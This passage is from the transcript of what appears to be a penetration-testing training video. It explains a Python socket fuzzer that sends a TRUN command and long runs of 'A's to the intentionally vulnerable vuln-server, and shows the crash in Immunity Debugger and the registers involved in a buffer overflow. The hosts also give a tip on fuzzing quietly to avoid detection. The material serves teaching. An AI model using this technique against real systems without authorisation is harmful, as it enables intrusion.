00:07:39.380\nSo it's a good thing\nthat we used variables.\n\n156\n00:07:39.380 --> 00:07:40.920\nVariables make our lives\na whole lot easier.\n\n157\n00:07:40.920 --> 00:07:41.890\nSo that's what I've done here.\n\n158\n00:07:43.290 --> 00:07:43.940\nLet's see here.\n\n159\n00:07:43.940 --> 00:07:44.920\nLet's move down.\n\n160\n00:07:44.920 --> 00:07:51.700\nWe have this length equals int raw_ input\nlength of attack, what is going on here.\n\n161\n00:07:51.700 --> 00:07:52.428\n&gt;&gt; Is that English, Dan?\n\n162\n00:07:52.428 --> 00:07:54.060\n[LAUGH]\n&gt;&gt; [LAUGH] I heavily commented,\n\n163\n00:07:54.060 --> 00:07:57.932\nwell at least I commented the top of\nthis a bit, so that you guys can see.\n\n164\n00:07:57.932 --> 00:08:03.003\nNow what we're doing is take in user input\nto define the length of the fuzz input and\n\n165\n00:08:03.003 --> 00:08:05.148\nmake it a variable called length.\n\n166\n00:08:05.148 --> 00:08:09.191\nSo we're defining a variable and\nwe're calling it length and\n\n167\n00:08:09.191 --> 00:08:13.760\nwe're telling it, ask the user for\ninput at this point, right.\n\n168\n00:08:13.760 --> 00:08:16.430\nThat's why this is raw input right here.\n\n169\n00:08:16.430 --> 00:08:20.910\nSo it's basically going to ask you what is\nthe length of the attack you would like?\n\n170\n00:08:20.910 --> 00:08:23.730\nSo basically we're defining how much data\n\n171\n00:08:23.730 --> 00:08:26.830\nwe want to send to our vulnerable\nserver into its input.\n\n172\n00:08:28.330 --> 00:08:31.620\nAnd then we move down just a bit and\nwe say,\n\n173\n00:08:31.620 --> 00:08:35.670\nlet's create a variable called s\nwhich defines the socket connection.\n\n174\n00:08:35.670 --> 00:08:36.530\nThere it is right here,\n\n175\n00:08:36.530 --> 00:08:40.350\ns = socket.socket and we have a little\nbit of extra that goes along with this.\n\n176\n00:08:40.350 --> 00:08:41.840\nAgain, this is Python programming,\n\n177\n00:08:41.840 --> 00:08:44.140\nwe actually have a Python\nprogramming course here at ITProTV.\n\n178\n00:08:44.140 --> 00:08:46.168\nSo if you haven't seen that,\nyou should check that out,\n\n179\n00:08:46.168 --> 00:08:48.252\nit might help you out a little\nbit of what's going on here.\n\n180\n00:08:48.252 --> 00:08:54.710\nBut right here we get the socket.af_inets,\nthat is the IPv4 address.\n\n181\n00:08:54.710 --> 00:08:58.100\nI could've just hard coded\nthe IPv4 address right here, but\n\n182\n00:08:58.100 --> 00:08:59.940\nI'm using a variable and\nyou'll see that later.\n\n183\n00:08:59.940 --> 00:09:01.690\nAnd then we get stuck\nat that socket stream.\n\n184\n00:09:01.690 --> 00:09:03.790\nWhat type of socket are we creating?\n\n185\n00:09:03.790 --> 00:09:08.240\nThis is a stream, it's going to send\ndata and allow data to come back.\n\n186\n00:09:08.240 --> 00:09:10.020\nWe're keeping an open connection,\nit's a stream.\n\n187\n00:09:11.200 --> 00:09:12.328\nAll right, moving down.\n\n188\n00:09:12.328 --> 00:09:17.026\nConnect = s.connect(TCP_IP and\nTCP_PORT), so there you go,\n\n189\n00:09:17.026 --> 00:09:19.468\nthere it is calling our variables.\n\n190\n00:09:19.468 --> 00:09:24.030\nWhat's the TCP/IP address and\nwhat port do you want me to use?\n\n191\n00:09:24.030 --> 00:09:26.990\nAnd then we're making this\nvariable called connect, so\n\n192\n00:09:26.990 --> 00:09:28.410\nwe can use that later, obviously.\n\n193\n00:09:29.770 --> 00:09:33.220\nMoving down, the scroll, scroll,\nscroll, this is the meat and\n\n194\n00:09:33.220 --> 00:09:36.510\ntaters right here, ladies and\ngents, of I went a little too far.\n\n195\n00:09:36.510 --> 00:09:39.320\nLet me use my cursor here.\n\n196\n00:09:39.320 --> 00:09:40.540\nOnly bad thing about Nano.\n\n197\n00:09:40.540 --> 00:09:43.170\nI guess I can let me just pop that down,\nso\n\n198\n00:09:43.170 --> 00:09:44.570\nwe can get the whole thing on the screen.\n\n199\n00:09:44.570 --> 00:09:45.970\nThere we go.\n\n200\n00:09:45.970 --> 00:09:46.766\nSo what's happening here?\n\n201\n00:09:46.766 --> 00:09:49.750\n[COUGH] Excuse me.\n\n202\n00:09:49.750 --> 00:09:53.580\nWe are printing anything that\nwe receive from the server.\n\n203\n00:09:53.580 --> 00:09:55.040\nSo once we make the connection,\n\n204\n00:09:55.040 --> 00:09:57.770\nit's printing any information\nthat it pipes our way.\n\n205\n00:09:57.770 --> 00:10:00.898\nWe saw that when we connected the\n[INAUDIBLE] server, it never said welcome\n\n206\n00:10:00.898 --> 00:10:04.930\nto [INAUDIBLE] server, type help for help\nto see what commands are available, right?\n\n207\n00:10:04.930 --> 00:10:09.150\nSo we'll see that come back our way\ncuz we created that open socket.\n\n208\n00:10:09.150 --> 00:10:12.400\nThen it says print sending attack length.\n\n209\n00:10:12.400 --> 00:10:18.400\nAnd then whatever length that the user\ndefined when our Python script runs.\n\n210\n00:10:18.400 --> 00:10:21.020\nAnd then it goes to this, TRUN /.;/.\n\n211\n00:10:21.020 --> 00:10:26.970\nWhat is going on here?\n\n212\n00:10:26.970 --> 00:10:30.031\nSo this is an open source program,\nit came with the C code,\n\n213\n00:10:30.031 --> 00:10:31.966\nI can actually look into the C code.\n\n214\n00:10:31.966 --> 00:10:37.850\nAnd for the vuln-server to accept\ninput using the TRUN command.\n\n215\n00:10:37.850 --> 00:10:41.720\nTRUN is a valid command inside\nthe vuln-server's services.\n\n216\n00:10:41.720 --> 00:10:44.770\nFor the input to be valid,\nit needed a special character.\n\n217\n00:10:44.770 --> 00:10:48.060\nActually there's a few\ncommands that take input,\n\n218\n00:10:48.060 --> 00:10:50.760\nfour different ways to\nexploit vuln-server.\n\n219\n00:10:50.760 --> 00:10:54.550\nWe're only gonna show you one because you\nguys can then go play after we show you\n\n220\n00:10:54.550 --> 00:10:55.630\nhow to do this.\n\n221\n00:10:55.630 --> 00:10:59.020\nAnd it will probably get more difficult as\nyou go but you'll have the foundations.\n\n222\n00:10:59.020 --> 00:11:01.590\nAnd then spend sleepless nights pulling\nyour hair out trying to figure out\n\n223\n00:11:01.590 --> 00:11:02.902\nwhy this isn't working.\n\n224\n00:11:02.902 --> 00:11:04.145\n[LAUGH] So there's your-\n&gt;&gt; We'll take if from that angle.\n\n225\n00:11:04.145 --> 00:11:04.645\n[LAUGH]\n&gt;&gt; Yeah.\n\n226\n00:11:04.645 --> 00:11:05.671\nThere's your disclaimer.\n\n227\n00:11:05.671 --> 00:11:08.640\n[LAUGH] You will want to just like\n\n228\n00:11:08.640 --> 00:11:11.920\nkeep a bottle of Jack next to you\ncuz it's gonna be very frustrating.\n\n229\n00:11:11.920 --> 00:11:15.680\nBut there's a special character\nthat is necessary for\n\n230\n00:11:15.680 --> 00:11:20.255\nthat correct input and this would\nbe on any service that's running.\n\n231\n00:11:20.255 --> 00:11:23.854\nIf you're running FTP, right, and\nyou wanted to add a user account,\n\n232\n00:11:23.854 --> 00:11:25.328\nmaybe use an email service.\n\n233\n00:11:25.328 --> 00:11:27.599\nSome SMTP server that you're running,\n\n234\n00:11:27.599 --> 00:11:31.671\nthere are specific commands and\nspecific characters that are needed for\n\n235\n00:11:31.671 --> 00:11:36.580\nthem to work correctly and that would\nbe in the documentation normally.\n\n236\n00:11:36.580 --> 00:11:38.950\nThis did not come with documentation,\nit came with a source code.\n\n237\n00:11:38.950 --> 00:11:41.870\nSo I can look at the source code,\nlet's actually do that.\n\n238\n00:11:41.870 --> 00:11:46.750\nAnd if you're fuzzing an open source piece\nof software, great, you get to do that.\n\n239\n00:11:46.750 --> 00:11:50.800\nThe C code will be included with that\nprogram and you can look to the code.\n\n240\n00:11:50.800 --> 00:11:55.710\nAgain, kind of why you need to be able\nto look at code and see what's going on.\n\n241\n00:11:55.710 --> 00:11:58.610\nDon't need to necessarily be\nable to rewrite it verbatim, but\n\n242\n00:11:58.610 --> 00:12:01.920\nyou at least kind of\nunderstand what's happening.\n\n243\n00:12:01.920 --> 00:12:04.600\nSo let's jump over to our code,\nnow take a look at why that's there.\n\n244\n00:12:05.750 --> 00:12:07.470\nThere's our immunity, it's still running.\n\n245\n00:12:08.470 --> 00:12:11.980\nWould just lower that down, go over here.\n\n246\n00:12:11.980 --> 00:12:15.340\nHere's our source folder for\nthe code and there's vuln-server.c.\n\n247\n00:12:15.340 --> 00:12:19.040\nThat's the C code that's compiled\nthat created the program.\n\n248\n00:12:19.040 --> 00:12:20.520\nIt's just a flat text file.\n\n249\n00:12:20.520 --> 00:12:24.600\nSo you just open it with an editor,\nthere you go.\n\n250\n00:12:24.600 --> 00:12:29.640\nAnd if we scroll down a bit, you see\nthere's the includes for the C code.\n\n251\n00:12:30.950 --> 00:12:32.540\nWhat port it's running on.\n\n252\n00:12:32.540 --> 00:12:34.640\nWhat's default buffer length and\nthings of that nature.\n\n253\n00:12:34.640 --> 00:12:39.530\nThese are all good things for\nus to know as the pen tester here.\n\n254\n00:12:39.530 --> 00:12:45.060\nWe come down a bit, where is it,\nI know it's hiding in here.\n\n255\n00:12:45.060 --> 00:12:47.410\nAnd here we go,\nI think we're getting into it.\n\n256\n00:12:47.410 --> 00:12:49.040\nYeah, you'll start seeing\nthis stuff right here,\n\n257\n00:12:49.040 --> 00:12:52.290\nlike stats, there's our help command.\n\n258\n00:12:52.290 --> 00:12:56.630\nSo these are the commands and\nwhat they're defined to do.\n\n259\n00:12:56.630 --> 00:12:58.060\nHow they operate.\n\n260\n00:12:58.060 --> 00:12:59.920\nThat's this part of the code.\n\n261\n00:12:59.920 --> 00:13:04.680\nSo, once I found that, once I started\nseeing those commands and I can totally\n\n262\n00:13:04.680 --> 00:13:10.750\ngive you guys a little bit better of a\nlook in that if it's not too small there.\n\n263\n00:13:10.750 --> 00:13:12.550\nNo, that's perfect, there we go.\n\n264\n00:13:12.550 --> 00:13:15.850\nSo you see, I saw help,oh I remembered,\nthat's a command.\n\n265\n00:13:15.850 --> 00:13:19.920\nWhen I typed in help,\nI got things like STATS and RTIME and\n\n266\n00:13:19.920 --> 00:13:23.412\nLTIME, those were commands on the system,\nI found the right spot.\n\n267\n00:13:23.412 --> 00:13:28.188\nI wanna make sure and of course,\nshould probably look to this line by line.\n\n268\n00:13:28.188 --> 00:13:35.750\nBut let's look through here, we are using\nthe TRUN command right here, there's TRUN.\n\n269\n00:13:35.750 --> 00:13:42.006\nAnd you'll notice this part right here,\nif ((char)RecvBuf [i] == '.',\n\n270\n00:13:42.006 --> 00:13:46.290\nthen it works correctly is\nbasically what it's saying.\n\n271\n00:13:46.290 --> 00:13:50.030\nThat function is correct, it needs\nthat function to operate correctly.\n\n272\n00:13:50.030 --> 00:13:56.580\nSo there needs to be a period in the data\nthat goes to the input for it to be valid.\n\n273\n00:13:56.580 --> 00:13:59.460\nOtherwise, your buffer\noverflow is not going to work.\n\n274\n00:13:59.460 --> 00:14:01.760\nSo these are things that\nwe need to be able to find.\n\n275\n00:14:01.760 --> 00:14:03.701\nTypically, like I said,\n\n276\n00:14:03.701 --> 00:14:09.804\nthis is part of this learning this what\nthe people that created vuln-server did.\n\n277\n00:14:09.804 --> 00:14:12.499\nSo that you would look at source code,\nfind the problem or\n\n278\n00:14:12.499 --> 00:14:16.290\nat least part of the solution\nto the problem, should I say.\n\n279\n00:14:16.290 --> 00:14:18.940\nAnd implement that in your fuzzing and\nyour exploit.\n\n280\n00:14:18.940 --> 00:14:19.700\nSo we need that.\n\n281\n00:14:19.700 --> 00:14:21.240\nWe need to know that information.\n\n282\n00:14:21.240 --> 00:14:24.590\nThere's also other values in here and\nthat's why you'll see multiple values.\n\n283\n00:14:24.590 --> 00:14:27.560\nI just kind of made the all\nin one value there.\n\n284\n00:14:27.560 --> 00:14:29.870\nSo I'm gonna sort back out of here.\n\n285\n00:14:29.870 --> 00:14:31.960\nYou'll notice that I've got a period.\n\n286\n00:14:31.960 --> 00:14:35.110\nSo it's sending the TRUN command a space.\n\n287\n00:14:35.110 --> 00:14:38.030\nThen a forward slash, a period,\nthen a colon and another forward slash.\n\n288\n00:14:38.030 --> 00:14:40.272\nI don't remember why I added another\nforward slash, maybe that was a fat\n\n289\n00:14:40.272 --> 00:14:41.684\nfinger, but now I can't change it because-\n\n290\n00:14:41.684 --> 00:14:42.228\n&gt;&gt; [LAUGH]\n\n291\n00:14:42.228 --> 00:14:43.810\n&gt;&gt; [LAUGH]\n&gt;&gt; It works.\n\n292\n00:14:43.810 --> 00:14:46.330\n&gt;&gt; Yeah, it works and\nI'm not gonna break it by messing with it.\n\n293\n00:14:46.330 --> 00:14:50.980\nBut that period was necessary for\nmy input to be valid to make this work.\n\n294\n00:14:50.980 --> 00:14:54.250\nSo just keep that in mind, whatever\nservice you're working with, you'll need\n\n295\n00:14:54.250 --> 00:14:57.160\nto know those things before you can\ncreate a fuzzer that works correctly.\n\n296\n00:14:58.290 --> 00:15:01.040\nThen we get into the attack itself.\n\n297\n00:15:01.040 --> 00:15:02.685\nI say I put an attack\nbecause it was generic,\n\n298\n00:15:02.685 --> 00:15:04.610\nbecause really we're still\nin the fuzzing phase.\n\n299\n00:15:04.610 --> 00:15:06.400\nSo I could change that to fuzz.\n\n300\n00:15:06.400 --> 00:15:08.670\nBut just something that helps\nyou know what are we doing.\n\n301\n00:15:09.810 --> 00:15:10.890\nThe attack is the data.\n\n302\n00:15:10.890 --> 00:15:17.690\nThat's what data I want to send to\nthe input system of my vulnerable server.\n\n303\n00:15:17.690 --> 00:15:20.090\nAnd what I'm doing is I'm just\nsending a bunch of capital As.\n\n304\n00:15:20.090 --> 00:15:23.954\nAnd you'll notice that this\nis attack = \"a\" times length.\n\n305\n00:15:23.954 --> 00:15:25.150\nWell, what is length?\n\n306\n00:15:25.150 --> 00:15:28.400\nRemember, we defined length\nhigher in the script.\n\n307\n00:15:28.400 --> 00:15:30.640\nWhen we fire this off, it's gonna ask us.\n\n308\n00:15:30.640 --> 00:15:32.524\nWhat is the length of data\nyou would like to send?\n\n309\n00:15:32.524 --> 00:15:36.080\nAnd I can say 100, 1,000, 10,000,\n1,000,000, whatever it is.\n\n310\n00:15:37.130 --> 00:15:40.270\nI define that, that gets put\ninto length as a variable and\n\n311\n00:15:40.270 --> 00:15:45.240\nnow I'm using that variable to say\na times whatever the user defined.\n\n312\n00:15:45.240 --> 00:15:48.700\nSo if I say 1,000,\nit will send 1,000 As to the input\n\n313\n00:15:48.700 --> 00:15:51.620\nof that system along with\nthe command trun /.:/, right?\n\n314\n00:15:51.620 --> 00:15:54.467\nSo there we go.\n\n315\n00:15:54.467 --> 00:15:58.872\nHopefully, this is flowing, you're in\na zen like state, you're like yeah,\n\n316\n00:15:58.872 --> 00:15:59.805\n[LAUGH] uh-huh.\n\n317\n00:15:59.805 --> 00:16:01.663\nYeah, I'm with you, right?\n\n318\n00:16:01.663 --> 00:16:03.206\nThat's where I want you to be right now.\n\n319\n00:16:03.206 --> 00:16:05.990\nSo then we say, okay, send that.\n\n320\n00:16:05.990 --> 00:16:10.220\nSend the trun, send the attack variable.\n\n321\n00:16:10.220 --> 00:16:14.370\nAnd then we get this /r/n,\nthat's a return character and\n\n322\n00:16:14.370 --> 00:16:16.730\nthen a new line character, right?\n\n323\n00:16:16.730 --> 00:16:19.590\nSo basically hit the Enter key.\n\n324\n00:16:19.590 --> 00:16:21.525\n&gt;&gt; Character turn on old typewriters.\n\n325\n00:16:21.525 --> 00:16:22.243\n&gt;&gt; That's it, you nailed it.\n\n326\n00:16:22.243 --> 00:16:25.921\nSo I like to add that to my stuff cuz\nyou never know when that's gonna be.\n\n327\n00:16:25.921 --> 00:16:30.860\nWell, I want to hit return because return\nenters the command, so that's that.\n\n328\n00:16:30.860 --> 00:16:32.070\nAnd then I want to jump to a new line.\n\n329\n00:16:33.270 --> 00:16:35.850\nIt will print anything that it receives.\n\n330\n00:16:35.850 --> 00:16:39.750\nThere's that good old s.receive,\nand then a buffer length for that.\n\n331\n00:16:39.750 --> 00:16:42.950\nAnd then we wanna send an exit string.\n\n332\n00:16:42.950 --> 00:16:48.320\nOnce you're done, exit out of it,\ntype the exit command, return, new line.\n\n333\n00:16:48.320 --> 00:16:52.910\nPrint anything that it sends back and\nthen close the connection with s.close.\n\n334\n00:16:52.910 --> 00:16:54.910\nSo there is our fuzzer.\n\n335\n00:16:54.910 --> 00:16:57.730\nIt's a very simple script,\nnothing too difficult.\n\n336\n00:16:57.730 --> 00:17:01.670\nBasically all you're seeing here is\nI'm using Python to create a socket\n\n337\n00:17:01.670 --> 00:17:03.670\nconnection, and\nI'm sending some data to it.\n\n338\n00:17:03.670 --> 00:17:06.680\nThat's the two things\nthat is happening here.\n\n339\n00:17:06.680 --> 00:17:11.190\nOne more, it's taking input from the user\non how long the data links should be.\n\n340\n00:17:11.190 --> 00:17:12.020\nThat's it.\n\n341\n00:17:12.020 --> 00:17:12.560\nVery simple.\n\n342\n00:17:12.560 --> 00:17:15.465\nYou can go out to the interwebs and\nsay Python socket code and\n\n343\n00:17:15.465 --> 00:17:18.548\nyou'll probably find a million\nwebsites that say here is how to\n\n344\n00:17:18.548 --> 00:17:20.602\ncreate a socket connection with Python.\n\n345\n00:17:20.602 --> 00:17:21.700\nAnd you can get that.\n\n346\n00:17:21.700 --> 00:17:24.892\nI will make my source code available for\nyou guys into the show notes so\n\n347\n00:17:24.892 --> 00:17:27.990\nthat you can just copy this verbatim\nif you like and play with that.\n\n348\n00:17:27.990 --> 00:17:32.260\nI know it's difficult if you don't\nhave a programming background.\n\n349\n00:17:32.260 --> 00:17:34.450\nTrust me, I know, I know, right?\n\n350\n00:17:34.450 --> 00:17:35.920\nSo I will make this available for\nyou guys.\n\n351\n00:17:37.100 --> 00:17:39.430\nThat being said, let's run this.\n\n352\n00:17:39.430 --> 00:17:41.240\nLet's see what it does.\n\n353\n00:17:41.240 --> 00:17:46.760\nAll right, so let me exit out of here,\nCtrl+x, and we do have that running.\n\n354\n00:17:46.760 --> 00:17:47.916\nI'm just gonna close this source code.\n\n355\n00:17:47.916 --> 00:17:51.020\nSo we don't need that anymore.\n\n356\n00:17:51.020 --> 00:17:53.950\nGo back and then just get my.\n\n357\n00:17:53.950 --> 00:17:55.860\nAll right, so everything's running.\n\n358\n00:17:55.860 --> 00:17:59.580\nImmunity is running,\nthe program has been loaded into Immunity.\n\n359\n00:17:59.580 --> 00:18:01.450\nRemember, we're running\nas administrator here.\n\n360\n00:18:01.450 --> 00:18:04.870\nLet's see what happens when\nwe throw the fuzzer at it.\n\n361\n00:18:06.210 --> 00:18:08.180\nLet's see here, so just ./fuzzer.\n\n362\n00:18:08.180 --> 00:18:14.190\nDon't forget to make your\nlittle sploit here executable.\n\n363\n00:18:14.190 --> 00:18:18.120\nSo if you need to, do the chmod +x\nfuzzer.py so that it will actually run,\n\n364\n00:18:18.120 --> 00:18:20.940\notherwise, you're gonna get nowhere fast.\n\n365\n00:18:20.940 --> 00:18:24.420\nAnd then you can just do fuzzer.py and\nhit return.\n\n366\n00:18:24.420 --> 00:18:27.719\nIt's asking me, what is the length of\nthe attack that I want to throw at it?\n\n367\n00:18:27.719 --> 00:18:30.261\nI'll say okay, I'll throw 1,000 bytes.\n\n368\n00:18:30.261 --> 00:18:31.203\nLet's try that.\n\n369\n00:18:31.203 --> 00:18:31.953\nLet's start there.\n\n370\n00:18:31.953 --> 00:18:32.882\nHit return.\n\n371\n00:18:32.882 --> 00:18:37.109\nThis is sending attack length\n1,000 to Tron Tron complete and\n\n372\n00:18:37.109 --> 00:18:38.545\nan exit with goodbye.\n\n373\n00:18:38.545 --> 00:18:43.467\nCuz remember, we did it come in a lot\nof the send us any input after that and\n\n374\n00:18:43.467 --> 00:18:46.460\nthen it closed down but I'm out of there.\n\n375\n00:18:46.460 --> 00:18:47.180\nWhat's going on here?\n\n376\n00:18:47.180 --> 00:18:50.050\nCome back over here,\nI look at my Immunity.\n\n377\n00:18:50.050 --> 00:18:52.470\nAnd it's still running.\n\n378\n00:18:52.470 --> 00:18:56.020\nSo yeah,\nlook down in the bottom right-hand corner.\n\n379\n00:18:56.020 --> 00:18:58.080\nIf you can do a full screen for\nme real quick.\n\n380\n00:18:58.080 --> 00:18:58.824\nThere you go.\n\n381\n00:18:58.824 --> 00:19:00.420\nYou'll see, still running.\n\n382\n00:19:00.420 --> 00:19:01.570\nSo this program is still running.\n\n383\n00:19:01.570 --> 00:19:03.180\nIt did not crash.\n\n384\n00:19:03.180 --> 00:19:05.520\nLet me shrink down Immunity\njust to make sure.\n\n385\n00:19:05.520 --> 00:19:08.180\nMaybe it's just a glitch in the system.\n\n386\n00:19:08.180 --> 00:19:12.050\nNope, it's still saying connections,\nit's still waiting for connections.\n\n387\n00:19:12.050 --> 00:19:13.790\nIt did close a connection, but\n\n388\n00:19:13.790 --> 00:19:17.500\nit's still sitting there with a blinking\nlight allowing connections to come in.\n\n389\n00:19:17.500 --> 00:19:19.200\nSo we didn't crash the program.\n\n390\n00:19:19.200 --> 00:19:21.100\nLet's bump up our game a little bit.\n\n391\n00:19:21.100 --> 00:19:22.780\nAnd you can be increasing\nthis by anything.\n\n392\n00:19:22.780 --> 00:19:26.180\nYou could create a program\nthat does a loop that tries to\n\n393\n00:19:26.180 --> 00:19:29.450\nincrementally throw data at it\nuntil it finds the right amount.\n\n394\n00:19:29.450 --> 00:19:36.346\nI tend to not like those though,\nbecause I just don't like those.\n\n395\n00:19:36.346 --> 00:19:40.539\nI like to be able to say let's try this,\nand then take a look,\n\n396\n00:19:40.539 --> 00:19:43.375\nexamine, okay that didn't work.\n\n397\n00:19:43.375 --> 00:19:46.369\nLet's try this, let me back up okay.\n\n398\n00:19:46.369 --> 00:19:49.545\nI like to be a little more in control\nthan just let my loops take a-\n\n399\n00:19:49.545 --> 00:19:50.785\n&gt;&gt; Yeah, absolutely and\n\n400\n00:19:50.785 --> 00:19:52.085\nmakes a lot less noise.\n\n401\n00:19:52.085 --> 00:19:56.887\nIf you just have one is gonna send\na 1,000 and then 1,100 then 1,200 then\n\n402\n00:19:56.887 --> 00:20:01.720\n1,300 then 1,500, eventually when\nit gets to 22,000, it crashes.\n\n403\n00:20:01.720 --> 00:20:05.858\nWell, that was a lot talking to that\nprogram and very easily could cause other\n\n404\n00:20:05.858 --> 00:20:09.995\nissues on the network or be detected if\nyou're trying to do a black box type pin\n\n405\n00:20:09.995 --> 00:20:13.265\ntest, whereas if I did 1,000,\nthat didn't crash it.\n\n406\n00:20:13.265 --> 00:20:17.320\n10,000 did crash it, okay,\nlet's divide that in half to 5,000.\n\n407\n00:20:17.320 --> 00:20:19.880\nThat didn't, let's bump up to 7,500.\n\n408\n00:20:19.880 --> 00:20:22.370\nI'm gonna end up in the long run\nI think having fewer steps and\n\n409\n00:20:22.370 --> 00:20:23.770\nfewer interactions with that server.\n\n410\n00:20:23.770 --> 00:20:24.950\n&gt;&gt; Yeah, you make a great point.\n\n411\n00:20:24.950 --> 00:20:27.480\nI didn't even think about that but\nthat's exactly right.\n\n412\n00:20:27.480 --> 00:20:28.930\nYou gotta think about\nyour network traffic.\n\n413\n00:20:28.930 --> 00:20:32.150\nYou are making contact with\nthese machines in some way.\n\n414\n00:20:32.150 --> 00:20:35.380\nAnd it might alert suspicion if\nyou're going buck wild, right?\n\n415\n00:20:35.380 --> 00:20:37.370\nSo keep the buck wildness down.\n\n416\n00:20:37.370 --> 00:20:40.432\n&gt;&gt; Or maybe kicks in and\nblocks that port down and now you're SOL.\n\n417\n00:20:40.432 --> 00:20:42.380\n&gt;&gt; Now you're getting nowhere fast, right?\n\n418\n00:20:42.380 --> 00:20:45.110\nSo, I like to do it that way.\n\n419\n00:20:45.110 --> 00:20:46.220\nSo let's throw some more data at it.\n\n420\n00:20:46.220 --> 00:20:49.680\nLet's see if we can't bump up\nour game just a bit and go on.\n\n421\n00:20:49.680 --> 00:20:50.920\nSo I'll just rerun my script.\n\n422\n00:20:52.400 --> 00:20:53.593\nI'll say 2,000 this time.\n\n423\n00:20:53.593 --> 00:20:57.000\nHit return.\n\n424\n00:20:57.000 --> 00:20:59.930\nIt says it's sending the attack link but\nit's not exiting.\n\n425\n00:20:59.930 --> 00:21:01.790\nMaybe we've gotten somewhere.\n\n426\n00:21:01.790 --> 00:21:03.340\nLet's go over here.\n\n427\n00:21:03.340 --> 00:21:06.960\nStill says it's waiting for\nclient connections, okay.\n\n428\n00:21:06.960 --> 00:21:07.890\nOver here.\n\n429\n00:21:07.890 --> 00:21:10.340\nThen we go full screen real\nquickly to the bottom.\n\n430\n00:21:10.340 --> 00:21:12.420\nWe've definitely had some activity.\n\n431\n00:21:12.420 --> 00:21:13.980\nNotice it says paused.\n\n432\n00:21:15.090 --> 00:21:16.370\nWhy is it paused?\n\n433\n00:21:16.370 --> 00:21:20.083\nIt's paused because it does not\nknow what to do with this data.\n\n434\n00:21:20.083 --> 00:21:21.617\nWe have crashed the system.\n\n435\n00:21:21.617 --> 00:21:25.684\nSo Immunity has kind of like handled that.\n\n436\n00:21:25.684 --> 00:21:29.042\nMaybe I'm just hiding the crash report but\n\n437\n00:21:29.042 --> 00:21:33.060\nthe things we doing alright\nas far as Windows goes.\n\n438\n00:21:33.060 --> 00:21:35.409\nIt's not crashing into\nWindows too hard but\n\n439\n00:21:35.409 --> 00:21:38.467\nwe're definitely getting\nan error inside of Immunity.\n\n440\n00:21:38.467 --> 00:21:41.488\nAnd it said hey, what's going on here?\n\n441\n00:21:41.488 --> 00:21:46.716\nYou might want to take a look at something\ncuz I'm not seeing what I want to see.\n\n442\n00:21:46.716 --> 00:21:49.710\nAnd if you look over in\nthis registers area,\n\n443\n00:21:49.710 --> 00:21:53.210\nthis is where we start getting\ninto interesting things.\n\n444\n00:21:53.210 --> 00:21:56.746\nYou'll notice this EAX register.\n\n445\n00:21:56.746 --> 00:21:57.610\nWhat does it say?\n\n446\n00:21:57.610 --> 00:21:58.450\n&gt;&gt; That looks familiar to me.\n\n447\n00:21:58.450 --> 00:21:59.450\n&gt;&gt; That does look familiar.\n\n448\n00:21:59.450 --> 00:22:03.450\nThat is our input that\nwe sent to the machine.\n\n449\n00:22:03.450 --> 00:22:06.700\nIt got loaded, apparently,\ninto the EAX register.\n\n450\n00:22:06.700 --> 00:22:07.573\nAnd there it is.\n\n451\n00:22:07.573 --> 00:22:12.590\nI can click on it,\nright-click right here in this area.\n\n452\n00:22:12.590 --> 00:22:15.900\nAnd I go to Follow and Dump.\n\n453\n00:22:15.900 --> 00:22:17.920\nThat's interesting stuff right over here.\n\n454\n00:22:19.550 --> 00:22:21.720\nSo let me see here.\n\n455\n00:22:21.720 --> 00:22:23.512\nActually just let me make sure,\nyes it's at 16.\n\n456\n00:22:23.512 --> 00:22:25.500\nLook at all these As.\n\n457\n00:22:25.500 --> 00:22:29.398\nThese all the As that got\nsent to that register, 2000.\n\n458\n00:22:29.398 --> 00:22:33.390\nWe didn't completely fill it up thought,\nright?\n\n459\n00:22:33.390 --> 00:22:35.510\nWe got maybe halfway through.\n\n460\n00:22:37.030 --> 00:22:39.262\nBut you might be going,\nwhat are all those 41s?\n\n461\n00:22:39.262 --> 00:22:40.269\nAnd those 41s are important.\n\n462\n00:22:40.269 --> 00:22:45.595\nThose 41s are the hex equivalent\nof the capital letter A.\n\n463\n00:22:45.595 --> 00:22:51.520\nSo get use to working in hex\nvalues when you work here,\n\n464\n00:22:51.520 --> 00:22:55.270\nbecause all this over here,\nlook at that, see all these hex values.\n\n465\n00:22:55.270 --> 00:22:57.520\nSee all these, hex values.\n\n466\n00:22:57.520 --> 00:22:58.895\nLook, more hex values.\n\n467\n00:22:58.895 --> 00:23:00.110\n&gt;&gt; [LAUGH]\n&gt;&gt; There's hex values.\n\n468\n00:23:00.110 --> 00:23:01.240\nThere's hex values everywhere.\n\n469\n00:23:01.240 --> 00:23:04.890\nSo get prepared to be\nfrustrated with hex values,\n\n470\n00:23:04.890 --> 00:23:06.060\ncuz they definitely are frustrating.\n\n471\n00:23:06.060 --> 00:23:08.916\n&gt;&gt; Have your hex calculator ready anyway,\nif you're not, yeah.\n\n472\n00:23:08.916 --> 00:23:10.509\n[LAUGH]\n&gt;&gt; Now the good news is,\n\n473\n00:23:10.509 --> 00:23:16.050\nyou're gonna learn the hex values that\nwe're dealing with pretty quickly.\n\n474\n00:23:16.050 --> 00:23:19.170\nBecause we're gonna be doing a,\ncapital As, capital Bs, capital Cs.\n\n475\n00:23:19.170 --> 00:23:20.430\nAnd it's 41, 42, 43.\n\n476\n00:23:20.430 --> 00:23:23.125\nYou probably just learned that.\n\n477\n00:23:23.125 --> 00:23:23.970\n&gt;&gt; [LAUGH]\n&gt;&gt; So if\n\n478\n00:23:23.970 --> 00:23:27.930\nyou have a human brain that works,\nconsider that part done.\n\n479\n00:23:27.930 --> 00:23:30.032\nSo that's important.\n\n480\n00:23:30.032 --> 00:23:32.890\nLet's see here,\nwhat else do I want you guys to see?\n\n481\n00:23:32.890 --> 00:23:36.780\nLet's just look in the registers area yet\nagain really quickly.\n\n482\n00:23:36.780 --> 00:23:40.958\nYou got this EIP,\nthat is the instruction pointer.\n\n483\n00:23:40.958 --> 00:23:47.110\nThat is saying, here is where you get\nyour next set of instructions, okay?\n\n484\n00:23:47.110 --> 00:23:50.073\nAnd that is a 4 byte value.\n\n485\n00:23:50.073 --> 00:23:56.106\nSo this equals 00401D98 is 4 hex values,\n\n486\n00:23:56.106 --> 00:23:59.416\nequaling 4 bytes, okay?\n\n487\n00:23:59.416 --> 00:24:02.266\nWe're gonna need to know that\ninformation cuz we're gonna\n\n488\n00:24:02.266 --> 00:24:04.040\nbe manipulating that information.\n\n489\n00:24:05.660 --> 00:24:08.280\nThe ESP is also another good one to know.\n\n490\n00:24:08.280 --> 00:24:10.340\nThe stack pointer.\n\n491\n00:24:10.340 --> 00:24:12.610\nThese 